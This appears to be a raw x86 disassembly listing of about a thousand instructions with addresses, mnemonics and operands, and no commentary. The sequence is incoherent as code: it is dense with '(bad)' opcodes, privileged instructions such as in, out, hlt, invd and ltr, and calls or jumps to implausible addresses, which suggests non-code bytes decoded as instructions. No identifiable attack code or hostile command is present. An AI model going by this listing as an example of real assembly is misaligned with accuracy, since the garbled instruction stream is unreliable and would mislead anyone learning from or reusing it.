  40c194:	rcl    DWORD PTR [ebx+0xc],0xbe
  40c198:	stc    
  40c199:	or     BYTE PTR [ebp+0x7],bh
  40c19c:	mov    esi,eax
  40c19e:	in     al,dx
  40c19f:	sahf   
  40c1a0:	jne    0x40c1d4
  40c1a2:	mov    eax,DWORD PTR [ebx]
  40c1a4:	or     BYTE PTR [ecx+0x45b4e8f1],cl
  40c1aa:	sahf   
  40c1ab:	xor    esi,DWORD PTR [edx]
  40c1ad:	add    ecx,DWORD PTR [ecx+0x75e0e089]
  40c1b3:	mov    ecx,DWORD PTR [ebx-0xeba13e0]
  40c1b9:	mov    esi,edx
  40c1bb:	lock inc cl
  40c1be:	push   ss
  40c1bf:	inc    ebp
  40c1c0:	jne    0x40c143
  40c1c2:	mov    esi,eax
  40c1c4:	in     al,dx
  40c1c5:	mov    ch,0xf1
  40c1c7:	clc    
  40c1c8:	repnz inc ebp
  40c1ca:	dec    BYTE PTR [ebx-0x3e8a07f8]
  40c1d0:	mov    eax,DWORD PTR [ebp-0x24]
  40c1d3:	cmp    DWORD PTR [esi],0xff85c3f8
  40c1d9:	clc    
  40c1da:	call   0x5dcc6124
  40c1df:	hlt    
  40c1e0:	add    ecx,eax
  40c1e2:	clc    
  40c1e3:	inc    ebp
  40c1e4:	jne    0x40c167
  40c1e6:	mov    esi,esp
  40c1e8:	clc    
  40c1e9:	test   DWORD PTR [ebp-0x8],ebx
  40c1ec:	xor    eax,DWORD PTR [ebp+0x3b]
  40c1ef:	mov    esi,ebx
  40c1f1:	in     al,dx
  40c1f2:	xchg   ebp,eax
  40c1f3:	rol    DWORD PTR [ecx],0x45
  40c1f6:	sbb    BYTE PTR [ecx+0x58bec45],al
  40c1fc:	cld    
  40c1fd:	clc    
  40c1fe:	pop    eax
  40c1ff:	pop    es
  40c200:	xor    eax,DWORD PTR [eax]
  40c202:	add    esp,DWORD PTR [esi-0x77]
  40c205:	inc    ebp
  40c206:	hlt    
  40c207:	mov    ebx,esi
  40c209:	or     BYTE PTR [ebp-0x7b0040],al
  40c20f:	add    ecx,DWORD PTR [ebx-0x14ba2800]
  40c215:	test   DWORD PTR [ebx-0x3e2b03f1],ecx
  40c21b:	add    dl,al
  40c21d:	mov    ecx,ecx
  40c21f:	sbb    BYTE PTR [eax],cl
  40c221:	rcl    BYTE PTR [ebp-0x7c],0xec
  40c225:	add    ebp,esp
  40c227:	add    bh,al
  40c229:	mov    edi,esp
  40c22b:	and    BYTE PTR [ebp+0x4500f842],al
  40c231:	data16 xor al,0xc1
  40c234:	pushf  
  40c235:	or     BYTE PTR [ebx+0x5666fc00],cl
  40c23b:	rcl    DWORD PTR [edi+0x4d],0x51
  40c23f:	xor    ax,WORD PTR [ecx]
  40c242:	mov    ebx,0x37285
  40c247:	add    bl,al
  40c249:	inc    ebp
  40c24a:	inc    ebp
  40c24b:	mov    ecx,DWORD PTR [ebx-0x39ba03f8]
  40c251:	add    eax,ebx
  40c253:	cmp    al,0x45
  40c255:	inc    ebp
  40c256:	push   edi
  40c257:	mov    edi,DWORD PTR [ebp+0x50]
  40c25a:	mov    eax,eax
  40c25c:	lock test BYTE PTR [ebp+0x3],cl
  40c260:	xor    eax,DWORD PTR [eax]
  40c262:	mov    DWORD PTR [ebp-0x10],eax
  40c265:	xor    eax,0x8b358c45
  40c26a:	pushf  
  40c26b:	aam    0x8b
  40c26d:	xabort 0xc3
  40c270:	dec    ebp
  40c271:	inc    ebp
  40c272:	xor    ecx,DWORD PTR [ebx-0x78070377]
  40c278:	inc    ebp
  40c279:	add    ebp,esi
  40c27b:	add    BYTE PTR [eax+ecx*1+0x3f4498b],bl
  40c282:	dec    ebp
  40c283:	mov    esi,DWORD PTR [ebx]
  40c285:	cld    
  40c286:	mov    DWORD PTR [edi+0x4501f4],eax
  40c28c:	xor    DWORD PTR [eax],edx
  40c28e:	pushf  
  40c28f:	dec    ebp
  40c290:	mov    ecx,DWORD PTR [ecx-0x2db2df14]
  40c296:	xor    esi,DWORD PTR [ebx]
  40c298:	mov    DWORD PTR [edi+0x4501ec],eax
  40c29e:	xor    eax,0xb8529f55
  40c2a3:	push   ebp
  40c2a4:	xchg   ebp,eax
  40c2a5:	xor    eax,DWORD PTR [eax]
  40c2a7:	add    ecx,DWORD PTR [ecx+0x45712052]
  40c2ad:	inc    DWORD PTR [ebp-0x20aff0e0]
  40c2b3:	mov    eax,DWORD PTR [eax]
  40c2b5:	in     al,0x8b
  40c2b7:	inc    ecx
  40c2b8:	or     al,0x8b
  40c2ba:	rcl    BYTE PTR [eax-0x7c],0xc8
  40c2be:	add    eax,DWORD PTR [ebp+0x0]
  40c2c1:	push   ecx
  40c2c2:	inc    ebp
  40c2c3:	call   0x4fcc4d
  40c2c8:	leave  
  40c2c9:	push   ebp
  40c2ca:	add    BYTE PTR [ebx+0x459466],cl
  40c2d0:	mov    ecx,0x8b8a89
  40c2d5:	or     al,0x33
  40c2d7:	jo     0x40c292
  40c2d9:	(bad)  
  40c2da:	cmp    ecx,DWORD PTR [eax]
  40c2dc:	add    al,ch
  40c2de:	add    eax,DWORD PTR [edi]
  40c2e0:	mov    eax,DWORD PTR [eax]
  40c2e2:	or     BYTE PTR [ebp+0x39],cl
  40c2e5:	mov    ecx,DWORD PTR [edi]
  40c2e7:	cmp    al,0xa9
  40c2e9:	rol    DWORD PTR [eax],0xb7
  40c2ec:	mov    edx,DWORD PTR [esp+edi*8]
  40c2ef:	dec    esp
  40c2f0:	dec    ebp
  40c2f1:	sbb    BYTE PTR [ebx+0x418b084d],cl
  40c2f7:	cld    
  40c2f8:	mov    DWORD PTR [edi-0x31bff9f4],esi
  40c2fe:	test   ebx,ecx
  40c300:	cmovne ecx,DWORD PTR [edi-0x38f0ffc5]
  40c307:	test   al,0xd4
  40c309:	add    BYTE PTR [ebp+0x45fcf88b],al
  40c30f:	into   
  40c310:	xor    ecx,ebx
  40c312:	add    ecx,DWORD PTR [ebp-0x77]
  40c315:	mov    edx,esp
  40c317:	fadd   QWORD PTR [ebp-0x49]
  40c31a:	mov    eax,DWORD PTR [esi]
  40c31c:	nop
  40c31d:	into   
  40c31e:	add    cl,dl
  40c320:	mov    edx,ebx
  40c322:	mov    edx,DWORD PTR [ebp+0x3c]
  40c325:	invd   
  40c327:	mov    BYTE PTR [ebp+0x0],al
  40c32a:	mov    ecx,DWORD PTR [ebx-0x3dffe774]
  40c330:	mov    ecx,DWORD PTR [ecx+0x3e41889]
  40c336:	push   ebp
  40c337:	push   ebp
  40c338:	cmp    ecx,DWORD PTR [ebx+0x488b3875]
  40c33e:	fmul   DWORD PTR [ecx+0x28dd000]
  40c344:	call   0xf8484f0a
  40c349:	rcl    esi,1
  40c34b:	rcl    ebx,0x45
  40c34e:	call   DWORD PTR [eax+0x50]
  40c351:	inc    edx
  40c352:	jne    0x40c357
  40c354:	jmp    DWORD PTR [eax]
  40c356:	sbb    al,0xe8
  40c358:	dec    ebp
  40c359:	or     BYTE PTR [ebx+0x49555400],cl
  40c35f:	mov    ebp,DWORD PTR [ebx]
  40c361:	sbb    BYTE PTR [ebx],al
  40c363:	dec    eax
  40c364:	and    BYTE PTR [ebx],dh
  40c366:	push   eax
  40c367:	add    edi,DWORD PTR [ebx]
  40c369:	cmp    eax,DWORD PTR [eax]
  40c36b:	je     0x40c2f8
  40c36d:	push   ecx
  40c36e:	and    BYTE PTR [ebp-0x79],cl
  40c371:	add    eax,DWORD PTR [ecx]
  40c373:	or     al,0x0
  40c375:	inc    eax
  40c376:	adc    BYTE PTR [ebx],al
  40c378:	inc    ebp
  40c379:	and    bh,bh
  40c37b:	push   eax
  40c37c:	push   esp
  40c37d:	sub    DWORD PTR [ebp+0x0],esi
  40c380:	push   edx
  40c381:	mov    ecx,eax
  40c383:	sbb    BYTE PTR [eax],al
  40c385:	dec    ebp
  40c386:	mov    ecx,DWORD PTR [ebx-0x3fbe1fe0]
  40c38c:	add    esi,DWORD PTR [ebx]
  40c38e:	jge    0x72cdcddc
  40c394:	add    DWORD PTR [eax],eax
  40c396:	mov    DWORD PTR [ebp+0x18],edx
  40c399:	mov    DWORD PTR [ebp+0x18],ecx
  40c39c:	cmovne edx,DWORD PTR [eax+0xf]
  40c3a0:	xor    edx,DWORD PTR [edx+0x3]
  40c3a3:	xor    ecx,DWORD PTR [ecx-0x2e74f3d5]
  40c3a9:	or     al,0x84
  40c3ab:	rol    DWORD PTR [eax],cl
  40c3ad:	dec    ebp
  40c3ae:	add    BYTE PTR [ebx],bh
  40c3b0:	dec    ebp
  40c3b1:	jbe    0x40c3e6
  40c3b3:	mov    eax,DWORD PTR [ebx]
  40c3b5:	cld    
  40c3b6:	mov    DWORD PTR [edi+0x4d01e0],edx
  40c3bc:	bswap  esi
  40c3be:	push   eax
  40c3bf:	retf   
  40c3c0:	xor    ecx,DWORD PTR [ebp+0x2b]
  40c3c3:	mov    ebp,DWORD PTR [ebx]
  40c3c5:	and    BYTE PTR [ecx],bh
  40c3c7:	or     ah,al
  40c3c9:	daa    
  40c3ca:	xchg   DWORD PTR [edi+0x100],eax
  40c3d0:	push   ebp
  40c3d1:	push   ebp
  40c3d2:	adc    DWORD PTR [edx+0x8],0x55
  40c3d6:	push   ebp
  40c3d7:	xor    ebp,ebx
  40c3d9:	add    ecx,DWORD PTR [ebx+0x40551852]
  40c3df:	dec    DWORD PTR [ebp+0x45ffff54]
  40c3e5:	sbb    al,0x8b
  40c3e7:	rol    BYTE PTR [ebp-0x8fe8b7c],0x0
  40c3ee:	and    eax,DWORD PTR [ebp+0x3]
  40c3f1:	mov    edx,eax
  40c3f3:	enter  0x8b,0x4
  40c3f7:	mov    eax,DWORD PTR [ebp+0x33]
  40c3fa:	push   eax
  40c3fb:	add    esp,DWORD PTR [edi-0x74f5fff1]
  40c401:	add    ah,bh
  40c403:	add    DWORD PTR [ebp-0x28],0xffffff8b
  40c407:	mov    eax,0xd64f08
  40c40c:	ror    DWORD PTR [ecx-0x3fe83b36],cl
  40c412:	mov    esp,DWORD PTR [esi+0x8]
  40c415:	inc    ebp
  40c416:	dec    eax
  40c417:	mov    eax,0x44f8b
  40c41c:	inc    ebp
  40c41d:	mov    DWORD PTR [ecx-0x38],edx
  40c420:	call   0xc3cbe5
  40c425:	or     BYTE PTR [ebp-0x75],al
  40c428:	mov    esp,DWORD PTR [esi-0x24]
  40c42b:	inc    ebp
  40c42c:	push   ebp
  40c42d:	mov    eax,0x284e83
  40c432:	into   
  40c433:	mov    DWORD PTR [edx+ecx*8-0x31cd7662],ecx
  40c43a:	mov    eax,DWORD PTR [ebp+0xc]
  40c43d:	lea    eax,[ebp+0x45]
  40c440:	mov    edi,DWORD PTR [ecx+0xb78adc]
  40c446:	push   es
  40c447:	xor    eax,esi
  40c449:	mov    edx,0x453bd0
  40c44e:	sub    eax,DWORD PTR [ebx]
  40c450:	mov    edi,edi
  40c452:	loopne 0x40c45c
  40c454:	retf   0x837d
  40c457:	push   es
  40c458:	dec    ebp
  40c459:	mov    DWORD PTR [ebx+0xc78c72],ecx
  40c45f:	lods   al,BYTE PTR ds:[esi]
  40c460:	xor    edx,eax
  40c462:	add    esi,DWORD PTR [edx]
  40c464:	mov    DWORD PTR [ebp+0x18],eax
  40c467:	xlat   BYTE PTR ds:[ebx]
  40c468:	dec    ebp
  40c469:	sar    BYTE PTR [ebx],1
  40c46b:	(bad)  
  40c46c:	jne    0x40c422
  40c46e:	mov    esp,eax
  40c470:	fsub   st,st(7)
  40c472:	add    BYTE PTR [ebp-0x73],al
  40c475:	xor    ch,al
  40c477:	out    dx,al
  40c478:	mov    eax,edi
  40c47a:	hlt    
  40c47b:	mov    esp,0xd3d3d0d6
  40c480:	mov    eax,edi
  40c482:	in     al,0xc0
  40c484:	jb     0x40c467
  40c486:	push   ecx
  40c487:	inc    ebp
  40c488:	push   eax
  40c489:	jl     0x40c410
  40c48b:	leave  
  40c48c:	cmove  esi,esp
  40c48f:	lods   al,BYTE PTR ds:[esi]
  40c490:	add    BYTE PTR [eax],dl
  40c492:	mov    esi,edx
  40c494:	or     al,0x80
  40c496:	(bad)  
  40c497:	xor    eax,0x83008801
  40c49c:	or     DWORD PTR [edi],edx
  40c49e:	into   
  40c49f:	in     al,dx
  40c4a0:	retf   
  40c4a1:	xchg   DWORD PTR [ecx+eax*1+0x4d000001],eax
  40c4a8:	gs push ecx
  40c4aa:	add    BYTE PTR [eax+0x24],dl
  40c4ad:	mov    eax,DWORD PTR [eax]
  40c4af:	fsub   DWORD PTR [esi+0x0]
  40c4b2:	inc    ebp
  40c4b3:	lea    eax,[ebx-0x76aff554]
  40c4b9:	push   ecx
  40c4ba:	(bad)  
  40c4bb:	lea    ebx,[esi]
  40c4bd:	fadd   DWORD PTR [eax]
  40c4bf:	mov    esp,DWORD PTR [esi-0x74]
  40c4c2:	inc    ebp
  40c4c3:	add    BYTE PTR [ebx+0x65ff08ff],al
  40c4c9:	mov    eax,DWORD PTR [eax]
  40c4cb:	fmul   st,st(0)
  40c4cd:	ror    BYTE PTR [ecx-0x45ba33c6],0xeb
  40c4d4:	add    BYTE PTR [ebx-0x27b2769a],cl
  40c4da:	inc    bp
  40c4dc:	inc    ebp
  40c4dd:	je     0x40c46a
  40c4df:	mov    ecx,DWORD PTR [eax]
  40c4e1:	sbb    BYTE PTR [edi+ecx*4-0x3c],al
  40c4e5:	add    DWORD PTR [edx+0x0],eax
  40c4e8:	add    BYTE PTR [ecx],dl
  40c4ea:	jmpw   0x14f6
  40c4ee:	or     BYTE PTR [ebx+0x668c00],cl
  40c4f4:	retf   0x453b
  40c4f7:	jne    0x40c47c
  40c4f9:	mov    ecx,DWORD PTR [eax]
  40c4fb:	in     al,0x66
  40c4fd:	(bad)
  40c501:	add    BYTE PTR [ebp+0x52],al
  40c504:	enter  0xee03,0x89
  40c508:	(bad)  
  40c509:	sbb    al,0xb0
  40c50b:	inc    ebp
  40c50c:	jmp    0xea20:0x45ff3357
  40c513:	and    dh,ch
  40c515:	inc    edi
  40c517:	test   DWORD PTR [eax+0x3fc3ed0f],edi
  40c51d:	add    BYTE PTR [ebp-0x1],al
  40c520:	ror    BYTE PTR [esi+ebp*8],1
  40c523:	(bad)  
  40c524:	data16 jne 0x40c56c
  40c527:	call   0x7bd0d
  40c52c:	ret    0x33c0
  40c52f:	test   BYTE PTR [ebp-0x75fff300],cl
  40c535:	inc    ebp
  40c536:	or     BYTE PTR [ebx-0x3015dfb7],0x41
  40c53d:	sub    BYTE PTR [eax],dl
  40c53f:	(bad)  
  40c540:	stc    
  40c541:	test   DWORD PTR [edx+0xf],esi
  40c544:	mov    ebx,DWORD PTR [ecx+0x570000d8]
  40c54a:	lea    esi,[ebp-0x3c]
  40c54d:	call   0xff45c051
  40c552:	pop    eax
  40c554:	add    DWORD PTR [eax+eax*1+0x52005500],eax
  40c55b:	xchg   edi,edi
  40c55d:	add    DWORD PTR [eax],ecx
  40c55f:	add    BYTE PTR [ebp+0x55],cl
  40c562:	push   ecx
  40c563:	cmp    ecx,DWORD PTR [edi+0x8b0175]
  40c569:	fdiv   DWORD PTR [ecx]
  40c56b:	add    al,dl
  40c56d:	lea    eax,[ebp-0x18]
  40c570:	test   edi,edi
  40c572:	je     0x40c55c
  40c574:	mov    DWORD PTR [ebp+0x8],ecx
  40c577:	dec    DWORD PTR [edx]
  40c579:	push   esp
  40c57a:	add    bh,bh
  40c57c:	inc    ebp
  40c57d:	sbb    al,0x3b
  40c57f:	push   ebp
  40c580:	or     BYTE PTR [ebx+0x50c80d],cl
  40c586:	mov    ecx,DWORD PTR [ebx+0x300338c]
  40c58c:	cmp    esi,DWORD PTR [ebp+esi*2-0x75]
  40c590:	mov    ecx,DWORD PTR [eax+ebx*1]
  40c593:	inc    ecx
  40c594:	pop    edi
  40c596:	add    DWORD PTR [eax],ecx
  40c598:	add    BYTE PTR [ebp+0x7511f811],ah
  40c59e:	push   ebp
  40c59f:	dec    DWORD PTR [ebx+0xf69014]
  40c5a5:	or     BYTE PTR [ebx+0x11752800],cl
  40c5ab:	adc    DWORD PTR [eax-0x62],0x660c008b
  40c5b2:	push   eax
  40c5b3:	jno    0x40c62a
  40c5b5:	add    ebp,eax
  40c5b7:	push   edx
  40c5b8:	clc    
  40c5b9:	sar    bh,1
  40c5bb:	xchg   eax,eax
  40c5bd:	add    DWORD PTR [eax+eax*1-0x7ff7b00],eax
  40c5c4:	jne    0x40c5d0
  40c5c6:	mov    eax,DWORD PTR [ebp-0x1]
  40c5c9:	mov    esp,DWORD PTR [eax]
  40c5cb:	sub    BYTE PTR [edx+eax*8-0x1],ah
  40c5cf:	rol    BYTE PTR [ebp-0x5174f0bb],1
  40c5d5:	loopne 0x40c5d7
  40c5d7:	dec    ebp
  40c5d8:	mov    ecx,DWORD PTR [ecx+0x1855c70c]
  40c5de:	mov    eax,DWORD PTR [eax]
  40c5e0:	call   0xffbebbe5
  40c5e5:	add    al,al
  40c5e7:	add    al,0x84
  40c5e9:	add    BYTE PTR gs:[eax],al
  40c5ec:	add    BYTE PTR [ebp-0x1],al
  40c5ef:	jmp    0x40c611
  40c5f1:	xor    ecx,eax
  40c5f3:	pop    edi
  40c5f4:	call   FWORD PTR [ebx-0x7b]
  40c5f7:	ret    0xf
  40c5fa:	mov    BYTE PTR [ebx+0x518b0f00],cl
  40c600:	mov    WORD PTR [edi],cs
  40c602:	add    BYTE PTR [ecx-0x75],al
  40c605:	push   ebx
  40c606:	and    BYTE PTR [ebx],dh
  40c608:	adc    BYTE PTR [ebp-0x7a78f7e6],cl
  40c60e:	add    DWORD PTR [eax+eax*1-0x75],esi
  40c612:	dec    ebp
  40c613:	or     al,0x51
  40c615:	sbb    al,0x75
  40c617:	cmp    DWORD PTR [ebx+0x710ce408],ecx
  40c61d:	pop    eax
  40c61e:	push   edx
  40c61f:	add    edx,DWORD PTR [eax+0x3]
  40c622:	mov    edi,DWORD PTR [ecx]
  40c624:	and    BYTE PTR [eax],cl
  40c626:	xchg   DWORD PTR [edx],ecx
  40c628:	add    eax,eax
  40c62a:	add    BYTE PTR [edi+0x0],al
  40c62d:	cli    
  40c62e:	(bad)  
  40c62f:	loope  0x40c5f4
  40c631:	shl    BYTE PTR [edi],0x5b
  40c634:	dec    ebp
  40c635:	ret    0x8b
  40c638:	sub    BYTE PTR [ebx+0x28358345],cl
  40c63e:	pushf  
  40c63f:	inc    ebp
  40c640:	mov    esi,DWORD PTR ds:0xc7759c08
  40c646:	and    esp,0xf8008557
  40c64c:	inc    DWORD PTR [ebp+0x10]
  40c64f:	xor    eax,esi
  40c651:	pushf  
  40c652:	jb     0x40c60c
  40c654:	add    BYTE PTR [edi+0x9],cl
  40c657:	add    BYTE PTR [esi],dl
  40c659:	mov    edx,eax
  40c65b:	hlt    
  40c65c:	inc    eax
  40c65e:	(bad)  
  40c65f:	data16 rol BYTE PTR [ebp+0x0],1
  40c663:	mov    eax,0x9c4f34
  40c668:	jmp    0x40c5f3
  40c66a:	mov    edi,eax
  40c66c:	or     al,0xc0
  40c66e:	inc    eax
  40c66f:	add    ax,WORD PTR [ebp-0x1]
  40c673:	mov    ecx,DWORD PTR [ecx+0x4545e008]
  40c679:	mov    ecx,DWORD PTR [ebx+0x1451c0c]
  40c67f:	mov    eax,DWORD PTR [ebp-0x10]
  40c682:	add    DWORD PTR [ecx+0x7830800],edi
  40c688:	sbb    cl,al
  40c68a:	jne    0x40c617
  40c68c:	sub    esp,0x20
  40c68f:	sahf   
  40c690:	mov    esi,DWORD PTR [edx]
  40c692:	and    BYTE PTR [ebx],al
  40c694:	add    dl,BYTE PTR [edi-0x40]
  40c697:	lock pop esi
  40c699:	test   cl,cl
  40c69b:	add    DWORD PTR [eax+eax*1],ebx
  40c69e:	push   ebp
  40c69f:	inc    ebp
  40c6a0:	in     al,dx
  40c6a1:	mov    esi,DWORD PTR [edi-0x483ef918]
  40c6a7:	ret    0xf014
  40c6aa:	push   edi
  40c6ab:	test   bh,bh
  40c6ad:	add    DWORD PTR [eax+eax*1+0x18],eax
  40c6b1:	inc    ebp
  40c6b2:	shl    BYTE PTR [ebx],cl
  40c6b4:	pop    ds
  40c6b5:	add    ecx,DWORD PTR [eax-0x77]
  40c6b8:	(bad)  
  40c6b9:	loopne 0x40c6ec
  40c6bb:	inc    ebp
  40c6bc:	pop    ebp
  40c6bd:	xor    esi,DWORD PTR [edx+0x3]
  40c6c0:	mov    ecx,DWORD PTR [ecx-0x482623f8]
  40c6c6:	fdivp  st(4),st
  40c6c8:	pop    ebp
  40c6c9:	mov    bh,0x72
  40c6cb:	hlt    
  40c6cc:	add    DWORD PTR [edx+0x28],0x0
  40c6d0:	cmp    esp,DWORD PTR [esi+0x72]
  40c6d3:	lock xor eax,DWORD PTR [edx+0x5f]
  40c6d7:	add    BYTE PTR [ebp+0x66],bl
  40c6da:	add    al,0xfb
  40c6dc:	push   ebp
  40c6dd:	or     ah,ch
  40c6df:	add    ah,ch
  40c6e1:	data16 (bad) 
  40c6e3:	lock lock add eax,DWORD PTR [ebp+0x4566f82b]
  40c6eb:	jge    0x40c721
  40c6ed:	mov    ebx,DWORD PTR [eax+eiz*8+0x66d87dc7]
  40c6f4:	test   DWORD PTR [eax+edi*8],esi
  40c6f7:	sbb    si,WORD PTR [ebp+0x0]
  40c6fb:	mov    esp,DWORD PTR [esi-0x24]
  40c6fe:	inc    ebp
  40c6ff:	jge    0x40c684
  40c701:	pushaw 
  40c703:	xor    al,0x89
  40c705:	data16 cld 
  40c707:	jne    0x40c739
  40c709:	mov    esi,0x667200
  40c70e:	inc    ebp
  40c70f:	or     BYTE PTR [ebx-0x76742000],al
  40c715:	lock clc 
  40c717:	mov    eax,DWORD PTR [ebp+0xc]
  40c71a:	mov    edi,esi
  40c71c:	in     al,dx
  40c71d:	or     BYTE PTR [ebp+0x0],al
  40c720:	mov    esi,edi
  40c722:	call   0x53500c62
  40c727:	sbb    dl,BYTE PTR [edi+0x0]
  40c72a:	push   ecx
  40c72b:	mov    esi,DWORD PTR [ebx]
  40c72d:	lock push esi
  40c72f:	pop    ebp
  40c730:	jne    0x40c765
  40c732:	mov    edx,0x3b7203
  40c737:	retw   0x3b7d
  40c73b:	minpd  xmm7,xmm0
  40c73f:	str    WORD PTR [ebp+0x66f0008b]
  40c746:	jne    0x40c727
  40c748:	xor    eax,DWORD PTR [ebx+eax*1+0xf003b00]
  40c74f:	mov    esp,esi
  40c751:	cld    
  40c752:	add    BYTE PTR [edx-0x75],al
  40c755:	add    al,dh
  40c757:	sar    bx,0xc2
  40c75b:	mov    eax,DWORD PTR [ebp+0x8]
  40c75e:	mov    eax,DWORD PTR [ebx]
  40c760:	lock rcr di,0xc2
  40c765:	es inc ebp
  40c767:	mov    ecx,DWORD PTR [edi]
  40c769:	clc    
  40c76a:	jne    0x40c7ae
  40c76c:	(bad)  
  40c76e:	jge    0x40c7d6
  40c770:	mov    eax,0x8b8afb
  40c775:	or     BYTE PTR [ebx],dh
  40c777:	add    edi,DWORD PTR [ebx+0xdf8a66]
  40c77d:	push   cs
  40c77e:	xor    esi,DWORD PTR [edi-0x48c4f748]
  40c784:	add    ah,dh
  40c786:	add    edi,ebx
  40c788:	mov    ax,di
  40c78b:	or     dh,bh
  40c78d:	mov    ecx,DWORD PTR [ecx+0x7542f4fc]
  40c793:	add    BYTE PTR [ebx-0x7404139a],cl
  40c799:	mov    esi,DWORD PTR [edi+0xc]
  40c79c:	mov    DWORD PTR [ebx],eax
  40c79e:	or     BYTE PTR [esi+0x75],ah
  40c7a1:	fisttp WORD PTR [ebx-0x747417da]
  40c7a7:	clc    
  40c7a8:	ja     0x40c7ec
  40c7aa:	mov    DWORD PTR [eax],eax
  40c7ac:	or     al,0x66
  40c7ae:	sahf   
  40c7af:	sti    
  40c7b0:	add    BYTE PTR [ebx+0x3010ce9],cl
  40c7b6:	add    BYTE PTR [esi+0x7d],ah
  40c7b9:	fbld   TBYTE PTR [esi+0xe]
  40c7bc:	pop    ebp
  40c7bd:	mov    bh,0x81
  40c7bf:	or     al,0x57
  40c7c1:	mov    bh,0x0
  40c7c3:	hlt    
  40c7c4:	add    edi,ebx
  40c7c6:	mov    di,bx
  40c7c9:	or     al,0x84
  40c7cb:	mov    eax,DWORD PTR [ecx]
  40c7cd:	or     al,0x0
  40c7cf:	mov    edi,DWORD PTR [ebp+0x8]
  40c7d2:	mov    edi,DWORD PTR [ebx]
  40c7d4:	adc    BYTE PTR [edi],cl
  40c7d6:	stc    
  40c7d7:	mov    ebx,0x8bdf00fa
  40c7dc:	mov    ebx,eax
  40c7de:	or     al,0x5d
  40c7e0:	mov    esi,DWORD PTR [ebx]
  40c7e2:	or     BYTE PTR [ebp+0x72001f84],cl
  40c7e8:	add    BYTE PTR [eax],al
  40c7ea:	cmp    edi,DWORD PTR [ebp+0xf]
  40c7ed:	mov    ecx,DWORD PTR [ebp+0x665d00d8]
  40c7f3:	xor    edi,DWORD PTR [ebp-0x73]
  40c7f6:	mov    ebx,0x728a1f
  40c7fb:	add    BYTE PTR [ebx],dh
  40c7fd:	jge    0x40c865
  40c7ff:	mov    ebx,DWORD PTR [ebp-0x20]
  40c802:	pop    bp
  40c804:	clc    
  40c805:	cmp    di,WORD PTR [edx+esi*2]
  40c809:	data16 data16 jge 0x40c88a
  40c80d:	mov    edi,DWORD PTR [ebx+0x5d8adc]
  40c813:	xor    di,WORD PTR [esi+eiz*2]
  40c817:	pop    bp
  40c819:	jge    0x40c881
  40c81b:	mov    edi,eax
  40c81d:	lock cmp ecx,DWORD PTR [ebx-0x8f0f789]
  40c824:	jge    0x40c82e
  40c826:	ltr    WORD PTR [ebp-0x2]
  40c82a:	add    edi,DWORD PTR [ebx]
  40c82c:	hsubpd xmm4,xmm0
  40c830:	data16 (bad) 
  40c832:	jge    0x40c7bf
  40c834:	mov    ebx,0xf18ae4
  40c839:	dec    ebp
  40c83a:	xor    eax,DWORD PTR [ebx]
  40c83c:	minpd  xmm6,xmm1
  40c840:	data16 jne 0x40c83b
  40c843:	jmp    0x40c880
  40c845:	mov    esi,DWORD PTR [edx-0x10]
  40c848:	sar    WORD PTR [ebp+0x4d],1
  40c84c:	mov    ebx,0xa8a8d
  40c851:	jb     0x40c886
  40c853:	add    BYTE PTR [esi+0x4d],ah
  40c856:	pop    ebp
  40c857:	mov    esp,DWORD PTR [esi-0x20]
  40c85a:	clc    
  40c85b:	jne    0x40c898
  40c85d:	data16 ja 0x40c894
  40c860:	jnp    0xf1502ee3
  40c866:	pop    ebp
  40c867:	inc    edx
  40c868:	add    eax,DWORD PTR [eax]
  40c86a:	data16 data16 jge 0x40c860
  40c86e:	mov    dx,0x7d
  40c872:	data16 pop bp
  40c875:	icebp  
  40c876:	sbb    di,bx
  40c879:	jne    0x40c800
  40c87b:	mov    eax,DWORD PTR [eax]
  40c87d:	call   0x77be5382
  40c882:	mov    ebp,DWORD PTR [ebx]
  40c884:	in     al,dx
  40c885:	data16 stc 
  40c887:	repnz mov esp,0x32759e3b
  40c88d:	xor    ecx,DWORD PTR [ecx+0x7d33eceb]
  40c893:	inc    eax
  40c894:	mov    eax,DWORD PTR [edi]
  40c896:	call   0xbc74c1e0
  40c89b:	add    ebx,DWORD PTR [esi-0x76a4cda1]
  40c8a1:	ret    0xe8
  40c8a4:	jge    0x40c831
  40c8a6:	mov    edx,DWORD PTR [ecx-0x14]
  40c8a9:	mov    ecx,DWORD PTR [ebx-0x76f784aa]
  40c8af:	add    BYTE PTR [eax],cl
  40c8b1:	data16 jge 0x40c882
  40c8b4:	mov    eax,DWORD PTR [edx-0x18]
  40c8b7:	add    BYTE PTR [ebx-0x7631849a],cl
  40c8bd:	mov    edx,0xc77d000c
  40c8c2:	data16 cld 
  40c8c4:	pop    ebp
  40c8c5:	test   DWORD PTR [ecx+0x3557f8],eax
  40c8cb:	pushf  
  40c8cc:	add    esp,DWORD PTR [esi+0x66]
  40c8cf:	into   
  40c8d0:	fistp  WORD PTR [ebp-0x7b]
  40c8d3:	push   edi
  40c8d4:	(bad)  
  40c8d5:	mov    bh,0xff
  40c8d7:	mov    edi,0xff338d75
  40c8dc:	mov    edx,DWORD PTR [edi-0x10]
  40c8df:	push   ecx
  40c8e0:	repnz mov ebx,0x894faf
  40c8e6:	lock cmp edx,DWORD PTR [edx]
  40c8e9:	jne    0x40c940
  40c8eb:	mov    DWORD PTR [ebx],esi
  40c8ed:	cld    
  40c8ee:	mov    edx,DWORD PTR [edi-0x1c]
  40c8f1:	xor    ecx,DWORD PTR [ebx+ecx*4+0x6632339e]
  40c8f8:	mov    DWORD PTR [esp+eiz*8-0x749baac4],ecx
  40c8ff:	mov    ebx,0x8b3bec
  40c904:	push   esi
  40c905:	sub    ecx,eax
  40c907:	mov    ebx,0xba8a2b
  40c90c:	mov    dh,BYTE PTR [ebx]
  40c90e:	add    BYTE PTR [ebx+0xb94e33],bh
  40c914:	dec    esi
  40c915:	cmp    eax,DWORD PTR [eax]
  40c917:	jne    0x40c954
  40c919:	mov    esi,DWORD PTR [ebp-0x4]
  40c91c:	mov    ebx,DWORD PTR [ebx-0x24]
  40c91f:	stc    
  40c920:	jge    0x40c8a7
  40c922:	data16 clc 
  40c924:	xor    al,0x9
  40c926:	data16 into 
  40c928:	lock test BYTE PTR [ebx],dh
  40c92b:	ds data16 fs icebp 
  40c92f:	pop    esi
  40c930:	add    al,0xc3
  40c932:	ror    BYTE PTR [ebx+0x57c0510c],0xeb
  40c939:	inc    ebp
  40c93a:	mov    esi,DWORD PTR [esi]
  40c93c:	in     al,0x9c
  40c93e:	sar    DWORD PTR [esi-0x7a17a3e],0xc9
  40c945:	pop    ebx
  40c946:	or     al,0xff
  40c948:	push   ebp
  40c949:	mov    ebp,esp
